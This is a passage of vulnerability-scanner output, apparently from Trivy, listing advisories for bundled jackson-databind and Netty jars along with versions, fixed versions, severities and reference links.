                        │      │                         isories/GHSA-r7wm-3cxj-wff9 
                        │      ├ PublishedDate   : 2026-07-21T21:58:53Z 
                        │      ╰ LastModifiedDate: 2026-07-21T21:58:53Z 
                        ├ [1]  ╭ VulnerabilityID : CVE-2026-54515 
                        │      ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
                        │      ├ PkgPath         : openaf/openaf.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
                        │      │                  │       @2.22.0 
                        │      │                  ╰ UID : c3b2e55f064f8b6 
                        │      ├ InstalledVersion: 2.22.0 
                        │      ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:b741698fbb4285da68bdb4cc084bf6d221724e1d7c3686ea99a1d
                        │      │                   5b8cbeb793d 
                        │      ├ Title           : jackson-databind: jackson-databind: Ignored properties can
                        │      │                   be unexpectedly modified 
                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
                        │      │                   functionality and tree-model for Jackson Data Processor.
                        │      │                   From 2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
                        │      │                   BeanDeserializerBase.createContextual(), per-property
                        │      │                   @JsonIgnoreProperties exclusions are applied by
                        │      │                   _handleByNameInclusion(), producing a contextual
                        │      │                   deserializer whose BeanPropertyMap has the ignored
                        │      │                   properties removed. The subsequent per-property
                        │      │                   case-insensitivity block (triggered by
                        │      │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
                        │      │                   from this._beanProperties (the original, unfiltered map)
                        │      │                   instead of contextual._beanProperties, then overwrites the
                        │      │                   filtered map — restoring every property
                        │      │                   _handleByNameInclusion had just removed. The ignored
                        │      │                   property becomes writable again. This vulnerability is fixed
                        │      │                    in 2.18.9, 2.21.5, and 3.1.4. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-915 
                        │      ├ VendorSeverity   ╭ amazon: 3 
                        │      │                  ├ ghsa  : 2 
                        │      │                  ╰ redhat: 2 
                        │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
                        │      │                  │        │           /A:N 
                        │      │                  │        ╰ V3Score : 5.3 
                        │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L
                        │      │                           │           /A:N 
                        │      │                           ╰ V3Score : 5.3 
                        │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0
                        │      │                  │      e1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5
                        │      │                  │      962 
                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5
                        │      │                  │      964 
                        │      │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security
                        │      │                  │      /advisories/GHSA-5jmj-h7xm-6q6v 
                        │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
                        │      │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
                        │      ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
                        │      ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
                        ├ [2]  ╭ VulnerabilityID : CVE-2026-59889 
                        │      ├ VendorIDs        ─ [0]: GHSA-5gvw-p9qm-jgwh 
                        │      ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
                        │      ├ PkgPath         : openaf/openaf.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind
                        │      │                  │       @2.22.0 
                        │      │                  ╰ UID : c3b2e55f064f8b6 
                        │      ├ InstalledVersion: 2.22.0 
                        │      ├ FixedVersion    : 2.21.5, 2.18.9, 2.22.1 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59889 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:723cdc7a1a29904ea22093b365ae6753bb17e518dec7e0e0cf41e
                        │      │                   52e22cb03d6 
                        │      ├ Title           : jackson-databind: @JsonView ypassed for @JsonUnwrapped
                        │      │                   container properties on deserialization 
                        │      ├ Description     : jackson-databind contains the general-purpose data-binding
                        │      │                   functionality and tree-model for Jackson Data Processor.
                        │      │                   From 2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1,
                        │      │                   UnwrappedPropertyHandler.processUnwrapped() replays buffered
                        │      │                    JSON for a @JsonUnwrapped property and calls
                        │      │                   prop.deserializeAndSet() without a
                        │      │                   prop.visibleInView(ctxt.getActiveView()) guard, allowing a
                        │      │                   property annotated with both @JsonView and @JsonUnwrapped to
                        │      │                    be written from attacker JSON under a less-privileged
                        │      │                   active view. This issue is fixed in versions 2.18.9, 2.21.5,
                        │      │                    2.22.1, 3.1.5, and 3.2.1. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-863 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
                        │      │                         ╰ V3Score : 6.5 
                        │      ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
                        │      │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/d
                        │      │                  │      627a8a86fcb062429282f79f3f256f181ed2c7b 
                        │      │                  ├ [2]: https://github.com/FasterXML/jackson-databind/issues/6
                        │      │                  │      060 
                        │      │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/6056 
                        │      │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security
                        │      │                  │      /advisories/GHSA-5gvw-p9qm-jgwh 
                        │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
                        │      ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
                        │      ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
                        ├ [3]  ╭ VulnerabilityID : CVE-2026-59901 
                        │      ├ VendorIDs        ─ [0]: GHSA-558v-64gr-wgg4 
                        │      ├ PkgName         : io.netty:netty-codec-compression 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-compression-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-compression@4.2.15.Final 
                        │      │                  ╰ UID : 2e8e76cf94b0172 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59901 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:b0d3fad2c9c2537af4d522e4010ff539b094c32040746e0578f3e
                        │      │                   13a3df0ed65 
                        │      ├ Title           : Netty: [Bzip2Decoder] Infinite Loop in RLE State Machine
                        │      │                   Leads to Event-Loop Thread Hang 
                        │      ├ Description     : The `Bzip2Decoder` handler in Netty's compression codec
                        │      │                   pipeline is vulnerable to a denial-of-service attack through
                        │      │                    a malformed bzip2 stream that permanently captures the
                        │      │                   event-loop thread in an infinite loop. The vulnerability
                        │      │                   exists in the run-length encoding (RLE) state machine within
                        │      │                    [`Bzip2BlockDecompressor.read()`] 
                        │      ├ Severity        : HIGH 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
                        │      │                         │            :N/VA:H/SC:N/SI:N/SA:N 
                        │      │                         ╰ V40Score : 8.7 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │                         │      136.Final 
                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │                         │      16.Final 
                        │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-558v-64gr-wgg4 
                        ├ [4]  ╭ VulnerabilityID : CVE-2026-55831 
                        │      ├ VendorIDs        ─ [0]: GHSA-6jqx-86gh-f27w 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-55831 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:1e7450be5bf7cd897999700a8f9c0dfee3c5091fc55c3569a8fb2
                        │      │                   44eb8a9e6a7 
                        │      ├ Title           : Netty is a network application framework for development of
                        │      │                   protocol s ... 
                        │      ├ Description     : Netty is a network application framework for development of
                        │      │                   protocol servers and clients. Prior to 4.1.136.Final and
                        │      │                   4.2.16.Final, Netty's SPDY SETTINGS decoder accepts a
                        │      │                   peer-declared SETTINGS entry count up to the 24-bit
                        │      │                   frame-length limit and materializes every unique setting ID
                        │      │                   in `DefaultSpdySettingsFrame`, allowing a remote SPDY/3.1
                        │      │                   peer to send a syntactically valid roughly 2 MiB SETTINGS
                        │      │                   frame that creates 262144 map entries and amplifies network
                        │      │                   input into heap growth and ordered-map insertion work. This
                        │      │                   issue is fixed in versions 4.1.136.Final and 4.2.16.Final.[
                        │      │                   m 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ╭ [0]: CWE-400 
                        │      │                  ╰ [1]: CWE-770 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
                        │      │                         ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
                        │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                        │      │                  │      45cba624cbea239655c9003b 
                        │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                        │      │                  │      b0eb9a9e17b66c52aff680c6 
                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ├ [5]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-6jqx-86gh-f27w 
                        │      │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-55831 
                        │      ├ PublishedDate   : 2026-07-21T00:17:35.383Z 
                        │      ╰ LastModifiedDate: 2026-07-22T19:37:49.57Z 
                        ├ [5]  ╭ VulnerabilityID : CVE-2026-55833 
                        │      ├ VendorIDs        ─ [0]: GHSA-mvh2-crg5-v77c 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-55833 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:18114a3eaa132429263dc040bea7cb5971b7ef0a9e76021b48963
                        │      │                   6c17707ec8e 
                        │      ├ Title           : Netty is a network application framework for development of
                        │      │                   protocol s ... 
                        │      ├ Description     : Netty is a network application framework for development of
                        │      │                   protocol servers and clients. Prior to 4.1.136.Final and
                        │      │                   4.2.16.Final, Netty SPDY header decoding continues inflating
                        │      │                    zlib-compressed header blocks after the raw header parser
                        │      │                   has exceeded `maxHeaderSize` and marked the frame truncated
                        │      │                   in `SpdyFrameCodec`, allowing a remote peer to send a small
                        │      │                   compressed `HEADERS` block that expands into much larger raw
                        │      │                    header data and causes compression-amplified CPU and
                        │      │                   allocation churn. This issue is fixed in versions
                        │      │                   4.1.136.Final and 4.2.16.Final. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-400 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
                        │      │                         ╰ V3Score : 7.5 
                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
                        │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                        │      │                  │      45cba624cbea239655c9003b 
                        │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                        │      │                  │      b0eb9a9e17b66c52aff680c6 
                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ├ [5]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-mvh2-crg5-v77c 
                        │      │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-55833 
                        │      ├ PublishedDate   : 2026-07-21T00:17:35.537Z 
                        │      ╰ LastModifiedDate: 2026-07-22T19:38:08.847Z 
                        ├ [6]  ╭ VulnerabilityID : CVE-2026-56745 
                        │      ├ VendorIDs        ─ [0]: GHSA-jppx-w49h-x2qq 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56745 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:aeb6678dc3440f3f3d3e3a8e4fe667873c884e65df4e40713d6ff
                        │      │                   bc5efffb680 
                        │      ├ Title           : Netty: [SpdyHttpDecoder] ByteBuf Reference Leak on
                        │      │                   RST_STREAM Leads to Native Memory Exhaustion 
                        │      ├ Description     : Netty is a network application framework for development of
                        │      │                   protocol servers and clients. In versions 4.2.0.Final
                        │      │                   through 4.2.15.Final and 4.1.0.Final through 4.1.135.Final,
                        │      │                   the `SpdyHttpDecoder` handler in Netty's SPDY-to-HTTP codec
                        │      │                   allocates a pooled `ByteBuf` when processing a
                        │      │                   client-initiated `SYN_STREAM` frame with `FLAG_FIN=0` and
                        │      │                   stores the partially constructed `FullHttpRequest` in
                        │      │                   `messageMap`; when the remote peer sends `RST_STREAM` for
                        │      │                   that stream or the accumulated content exceeds
                        │      │                   `maxContentLength`, the decoder removes the entry but does
                        │      │                   not release the pooled `ByteBuf`, causing native memory
                        │      │                   exhaustion. This issue is fixed in versions 4.1.136.Final
                        │      │                   and 4.2.16.Final. 
                        │      ├ Severity        : HIGH 
                        │      ├ CweIDs           ─ [0]: CWE-400 
                        │      ├ VendorSeverity   ─ ghsa: 3 
                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
                        │      │                         │            :N/VA:H/SC:N/SI:N/SA:N 
                        │      │                         ╰ V40Score : 8.7 
                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
                        │      │                  ├ [1]: https://github.com/netty/netty/commit/5b68c61f37aa4a30
                        │      │                  │      45cba624cbea239655c9003b 
                        │      │                  ├ [2]: https://github.com/netty/netty/commit/bb2ff68a1fb71cb4
                        │      │                  │      b0eb9a9e17b66c52aff680c6 
                        │      │                  ├ [3]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [4]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ├ [5]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-jppx-w49h-x2qq 
                        │      │                  ╰ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-56745 
                        │      ├ PublishedDate   : 2026-07-21T22:17:14.5Z 
                        │      ╰ LastModifiedDate: 2026-07-22T20:35:40.827Z 
                        ├ [7]  ╭ VulnerabilityID : CVE-2026-56746 
                        │      ├ VendorIDs        ─ [0]: GHSA-6cqp-g7gg-8hr5 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56746 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:00e79fca441821fc57c5bc90d991f0bfab9e87ac6c56c6c60ad4e
                        │      │                   5f969dc2bcc 
                        │      ├ Title           : Netty: Security Control Bypass via CORS Short-Circuit Failure 
                        │      ├ Description     : Netty is a network application framework for development of
                        │      │                   protocol servers and clients. Versions 4.2.0.Final through
                        │      │                   4.2.15.Final and 4.1.0.Final through 4.1.135.Final, are
                        │      │                   vulnerable to security control bypass during the origin
                        │      │                   evaluation process. CorsHandler provides a shortCircuit()
                        │      │                   configuration designed to reject unauthorized cross-origin
                        │      │                   requests immediately, acting as a security control before
                        │      │                   requests reach the application. However, due to a logical
                        │      │                   operator error in the origin evaluation process, this
                        │      │                   protection can be entirely bypassed. An attacker can bypass
                        │      │                   the short-circuit mechanism by sending a request with an
                        │      │                   Origin: null header. This failure forwards unauthorized
                        │      │                   requests to the backend application, bypassing intended
                        │      │                   access controls. This issue is fixed in versions
                        │      │                   4.1.136.Final and 4.2.16.Final. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ CweIDs           ─ [0]: CWE-284 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N 
                        │      │                         ╰ V3Score : 6.5 
                        │      ├ References       ╭ [0]: https://github.com/netty/netty 
                        │      │                  ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │      │                  │      136.Final 
                        │      │                  ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │      │                  │      16.Final 
                        │      │                  ├ [3]: https://github.com/netty/netty/security/advisories/GHS
                        │      │                  │      A-6cqp-g7gg-8hr5 
                        │      │                  ╰ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-56746 
                        │      ├ PublishedDate   : 2026-07-21T22:17:14.667Z 
                        │      ╰ LastModifiedDate: 2026-07-22T20:35:40.827Z 
                        ├ [8]  ╭ VulnerabilityID : CVE-2026-59898 
                        │      ├ VendorIDs        ─ [0]: GHSA-4mp9-239f-g9hg 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59898 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:4d133c143030b55517c9fec93f50e022f6e46e307857822157597
                        │      │                   5c61e1034a7 
                        │      ├ Title           : Netty: WebSockets V07/V08 handshaker missing
                        │      │                   Connection/Upgrade validation 
                        │      ├ Description     : ## Summary
                        │      │                   An attacker can force WebSocket upgrade via the lax V07 (or
                        │      │                   V08) handshaker by sending `Sec-WebSocket-Version: 7` and
                        │      │                   omitting `Connection: Upgrade` / `Upgrade: websocket`
                        │      │                   headers, completing a protocol switch that a proxy would not
                        │      │                    recognize as an Upgrade request and enabling HTTP request
                        │      │                   smuggling / protocol-confusion attacks. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI
                        │      │                         │            :N/VA:N/SC:L/SI:L/SA:N 
                        │      │                         ╰ V40Score : 6.3 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │                         │      136.Final 
                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │                         │      16.Final 
                        │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-4mp9-239f-g9hg 
                        ├ [9]  ╭ VulnerabilityID : CVE-2026-59899 
                        │      ├ VendorIDs        ─ [0]: GHSA-q4f6-jm68-57ww 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
                        │      │                            d54f09aafb3326ca458a 
                        │      ├ SeveritySource  : ghsa 
                        │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59899 
                        │      ├ DataSource       ╭ ID  : ghsa 
                        │      │                  ├ Name: GitHub Security Advisory Maven 
                        │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
                        │      │                          cosystem%3Amaven 
                        │      ├ Fingerprint     : sha256:ecf53be6ae317e76f81b84c8c4c119d8800dba6d331e7ec316d52
                        │      │                   683612a0d20 
                        │      ├ Title           : Netty: [HttpContentEncoder] Unbounded Per-Connection Queue
                        │      │                   Growth via HTTP/1.1 Pipelining Leads to Denial of Service 
                        │      ├ Description     : ### Impact
                        │      │                   `HttpContentEncoder` (the superclass of the production
                        │      │                   handler `HttpContentCompressor`) maintains a per-channel
                        │      │                   `ArrayDeque<CharSequence>` named `acceptEncodingQueue` that
                        │      │                   accumulates attacker-controlled data without any size limit.
                        │      │                    The queue is filled on the I/O thread for every inbound
                        │      │                   HTTP request and drained only when the application later
                        │      │                   writes a non-1xx response. This creates a resource
                        │      │                   exhaustion vulnerability when an attacker exploits HTTP/1.1
                        │      │                   pipelining to flood the connection with requests faster than
                        │      │                    the application produces responses. 
                        │      ├ Severity        : MEDIUM 
                        │      ├ VendorSeverity   ─ ghsa: 2 
                        │      ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
                        │      │                         │            :N/VA:L/SC:N/SI:N/SA:N 
                        │      │                         ╰ V40Score : 6.9 
                        │      ╰ References       ╭ [0]: https://github.com/netty/netty 
                        │                         ├ [1]: https://github.com/netty/netty/releases/tag/netty-4.1.
                        │                         │      136.Final 
                        │                         ├ [2]: https://github.com/netty/netty/releases/tag/netty-4.2.
                        │                         │      16.Final 
                        │                         ╰ [3]: https://github.com/netty/netty/security/advisories/GHS
                        │                                A-q4f6-jm68-57ww 
                        ├ [10] ╭ VulnerabilityID : CVE-2026-59921 
                        │      ├ VendorIDs        ─ [0]: GHSA-gcjf-9mgh-3p7g 
                        │      ├ PkgName         : io.netty:netty-codec-http 
                        │      ├ PkgPath         : openaf/Kube/netty-codec-http-4.2.15.Final.jar 
                        │      ├ PkgIdentifier    ╭ PURL: pkg:maven/io.netty/netty-codec-http@4.2.15.Final 
                        │      │                  ╰ UID : 3fc77ba685baead2 
                        │      ├ InstalledVersion: 4.2.15.Final 
                        │      ├ FixedVersion    : 4.2.16.Final, 4.1.136.Final 
                        │      ├ Status          : fixed 
                        │      ├ Layer            ╭ Digest: sha256:3f40a027dde1d3be420bf78167d8778929cf9021943d
                        │      │                  │         384ed4f1eee4bd11e128 
                        │      │                  ╰ DiffID: sha256:7c3540a7fa06352170fc4be5b43ac295d368f87695f9
